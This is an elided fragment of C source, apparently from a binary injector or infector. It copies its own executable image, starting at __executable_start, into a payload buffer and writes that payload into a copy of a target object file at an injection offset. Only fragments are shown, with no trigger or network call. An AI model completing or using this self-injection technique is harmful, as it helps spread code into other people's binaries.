...
static void inject_code(t_env *env) {
	...
	// inject payload
	memmove(env->obj_cpy + env->inject_offset, env->payload_content, env->payload_size);
}
...
static int get_payload(t_env *env) {
	...
	bzero(env->payload_content, env->payload_size + 16);
	...
	memcpy((char*)env->payload_content + 16, &__executable_start, env->payload_size);
...
static int handle_obj(t_env *env) {
	...
	memset(env->obj_cpy, 0, env->new_obj_size + 1);
	memcpy(env->obj_cpy, env->obj, env->obj_size);
